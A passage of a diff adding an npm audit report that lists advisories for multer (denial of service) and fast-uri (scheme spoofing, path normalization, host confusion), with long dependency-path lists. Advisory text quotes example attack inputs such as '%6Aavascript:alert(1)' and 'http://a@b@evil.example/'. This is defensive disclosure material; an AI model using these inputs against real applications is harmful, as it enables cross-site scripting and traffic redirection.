+      "github_advisory_id": "GHSA-f72v-6w45-q472",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-23T22:13:18.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-178"
+      ],
+      "url": "https://github.com/advisories/GHSA-f72v-6w45-q472"
+    },
+    "1243083": {
+      "findings": [
+        {
+          "version": "2.4.0",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > multer@2.4.0",
+            "server > multer@2.4.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-q7qp-rjg7-q26m\n- https://nvd.nist.gov/vuln/detail/CVE-2026-113872\n- https://github.com/expressjs/multer/commit/80a2d9df1dfd63b5fab631b8b9966164ed647adf\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/expressjs/multer/releases/tag/v2.5.0\n- https://github.com/advisories/GHSA-q7qp-rjg7-q26m",
+      "created": "2026-10-23T22:08:22.000Z",
+      "id": 1243083,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nWhen `multer` is configured with an asynchronous `fileFilter`, a single request can crash the Node.js process. If a request is aborted (for example when one file is rejected) while another file's async `fileFilter` is still pending, the pending callback later resumes a parsing stream that multer has already torn down. busboy then emits an error on a stream that no longer has an error listener, which Node raises as an unhandled `'error'` event, and the process exits. A single unauthenticated request is enough, so any application using `multer` with an asynchronous `fileFilter` is affected, regardless of storage engine. Uploads using a synchronous `fileFilter` are not affected.\n\n### Patches\n\nUsers should upgrade to `multer` `2.5.0` or later.\n\n### Workarounds\n\nUse a synchronous `fileFilter`.",
+      "reported_by": null,
+      "title": "multer vulnerable to Denial of Service via a pending asynchronous fileFilter after request teardown",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-113872"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": ">=2.0.0 <2.5.0",
+      "github_advisory_id": "GHSA-q7qp-rjg7-q26m",
+      "recommendation": "Upgrade to version 2.5.0 or later",
+      "patched_versions": ">=2.5.0",
+      "updated": "2026-10-23T22:08:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-248",
+        "CWE-404"
+      ],
+      "url": "https://github.com/advisories/GHSA-q7qp-rjg7-q26m"
+    },
+    "1243098": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": [
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-w74x-v6f9-j3xg\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110306\n- https://github.com/fastify/fast-uri/commit/39933a1f1422986f14e2d844f552238feb40f5d4\n- https://github.com/fastify/fast-uri/commit/597f254c86d151568511eeb9a1df761fd12520b3\n- https://github.com/fastify/fast-uri/commit/e60e716f41d1d73717e2d803d20b68d2c6d20a0f\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-w74x-v6f9-j3xg",
+      "created": "2026-10-23T21:41:36.000Z",
+      "id": 1243098,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` percent-decodes the scheme component with the legacy global `unescape()` before validating it, so an input whose decoded scheme is a valid but dangerous token is emitted as a live scheme. RFC 3986 section 3.1 does not allow percent-encoding in a scheme, so no RFC or WHATWG parser treats such input as having that scheme, but `fast-uri` does.\n\nFor example, `normalize('%6Aavascript:alert(1)')` returns `javascript:alert(1)`, `resolve('https://a.example/', '%6Aavascript:alert(1)')` returns `javascript:alert(1)`, and `parse('%6Aavascript:alert(1)').scheme` returns `javascript`. The `%uXXXX` form (`%u006Aavascript:`) produces the same result, and `equal('%68ttp://a/', 'http://a/')` returns `true`.\n\nAn application that screens dangerous schemes on the raw input and then stores or renders `normalize(input)` or `resolve(base, input)` turns an inert string into an executable `javascript:`, `data:`, or `vbscript:` URL, a stored or reflected cross-site scripting vector in the consuming application. `equal()` also treats an encoded and a plain scheme as the same, which can bypass equality-based allowlists.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nReject input whose scheme part (before the first `:`, and before any `/`, `?`, or `#`) contains `%`. Alternatively, check `parse(x).scheme` against an allowlist after normalization and use that same parsed result rather than the raw string.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to URI scheme spoofing via percent-encoded scheme decoding",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110306"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.9",
+      "github_advisory_id": "GHSA-w74x-v6f9-j3xg",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:41:38.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-172",
+        "CWE-180"
+      ],
+      "url": "https://github.com/advisories/GHSA-w74x-v6f9-j3xg"
+    },
+    "1243101": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": [
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-xhq7-xmqj-769h\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110095\n- https://github.com/fastify/fast-uri/commit/048bbd0a252971be86d6579f0dfc87f8de5b9c47\n- https://github.com/fastify/fast-uri/commit/52774a5c35df36b0bbe439cd4c12c3dc0e50e3b9\n- https://github.com/fastify/fast-uri/commit/7c19f8b97ec51f1f20b4e3d9d5820cb8d5176058\n- https://github.com/fastify/fast-uri/commit/9eb8759a9825c046f57f7f695f1944bc39b88abd\n- https://github.com/fastify/fast-uri/commit/acc5c5d60c4209571789496e1732468911c7e12a\n- https://github.com/fastify/fast-uri/commit/b110a3571c37dfcf9d1c72ce2e2e178c78d1a424\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-xhq7-xmqj-769h",
+      "created": "2026-10-23T21:39:34.000Z",
+      "id": 1243101,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri`'s `normalize()` and `serialize()` apply RFC 3986 dot-segment removal (`remove_dot_segments`) to the path of a relative-path reference. RFC 3986 section 5.2.4 defines that algorithm only for the merged target path during resolution, not for the reference itself, so applied to the reference it drops leading `..` segments and can turn a document-relative reference into a root-relative one.\n\nFor example, `normalize('a/../b')` returns `/b` and `normalize('../x')` returns `x`, so `resolve(base, normalize(ref))` points at a different resource than `resolve(base, ref)`, and `equal()` treats distinct references as the same.\n\nApplications that normalize attacker-supplied or user-supplied relative references and then resolve them, or use them as cache, deduplication, or authorization keys, can have a reference escape its intended directory and point at a different resource.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nDo not normalize a relative reference before resolving it. Resolve it against the absolute base first, then normalize the absolute result.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to improper path equivalence in relative reference normalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110095"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.0.0 <3.1.9",
+      "github_advisory_id": "GHSA-xhq7-xmqj-769h",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:39:38.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-41"
+      ],
+      "url": "https://github.com/advisories/GHSA-xhq7-xmqj-769h"
+    },
+    "1243104": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": [
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/server@link:../server > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "packages/paperclip-runner > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > ajv@8.20.0 > fast-uri@3.1.8",
+            "server > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/fastify/fast-uri/security/advisories/GHSA-wjr9-j795-jxcr\n- https://nvd.nist.gov/vuln/detail/CVE-2026-110180\n- https://github.com/fastify/fast-uri/commit/58c183d0b168ad87f98773266444ce1f6375803a\n- https://github.com/fastify/fast-uri/commit/ddfc6a51122dfce0365655f04479fc3adb7f6b3c\n- https://github.com/fastify/fast-uri/commit/f6d46dfeab025d0c440485f4ae29fa4f14707646\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/fastify/fast-uri/releases/tag/v2.4.8\n- https://github.com/fastify/fast-uri/releases/tag/v3.1.9\n- https://github.com/fastify/fast-uri/releases/tag/v4.2.3\n- https://github.com/advisories/GHSA-wjr9-j795-jxcr",
+      "created": "2026-10-23T21:37:59.000Z",
+      "id": 1243104,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`fast-uri` versions `>= 2.4.2, <= 2.4.7`, `>= 3.1.3, <= 3.1.8`, and `>= 4.0.1, <= 4.2.2` can silently rewrite the host of an HTTP-family URL (`http`, `https`, `ws`, `wss`, or any scheme with `domainHost: true`). For those schemes `canonicalizeHost()` passes the parsed host to the WHATWG `URL` parser and adopts its `.hostname` without checking that the parser read the whole input as a host. RFC 3986 permits `@` inside the host group and the WHATWG parser strips TAB, LF, and CR, so the authority `fast-uri` reports is rewritten by that second parser with no `error` set: data before an `@` is dropped and whitespace is removed.\n\nFor example, `fast-uri` parses `http://a@b@evil.example/` to host `evil.example` (dropping the `b` segment), and a host containing a raw TAB, CR, or LF has those characters stripped. `equal()` then treats a whitespace-smuggled host as the same as the clean one, and `resolve()` rewrites the authority the same way.\n\nApplications that use `fast-uri` to enforce host-based policy (denylists, loopback filtering, redirect validation, outbound proxy routing) on one representation, such as the raw input, see a policy/use desync: the canonical host `fast-uri` returns differs from what was checked, and traffic can be steered to an unintended destination.\n\n### Patches\n\nUpgrade to `fast-uri` `2.4.8`, `3.1.9`, or `4.2.3`.\n\n### Workarounds\n\nReject URIs whose authority contains more than one `@`, or contains TAB, CR, or LF, before calling `fast-uri`. Alternatively, treat any non-empty `parse(x).error` as fatal, and compare hosts only from the same `parse()` result.",
+      "reported_by": null,
+      "title": "fast-uri vulnerable to host confusion via unchecked WHATWG host canonicalization",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-110180"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "fast-uri",
+      "vulnerable_versions": ">=3.1.3 <3.1.9",
+      "github_advisory_id": "GHSA-wjr9-j795-jxcr",
+      "recommendation": "Upgrade to version 3.1.9 or later",
+      "patched_versions": ">=3.1.9",
+      "updated": "2026-10-23T21:38:02.000Z",
+      "cvss": {
+        "score": 4.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-wjr9-j795-jxcr"
+    },
+    "1243107": {
+      "findings": [
+        {
+          "version": "3.1.8",
+          "paths": [
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv@8.20.0 > fast-uri@3.1.8",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > ajv-formats@3.0.1 > ajv@8.20.0 > fast-uri@3.1.8",
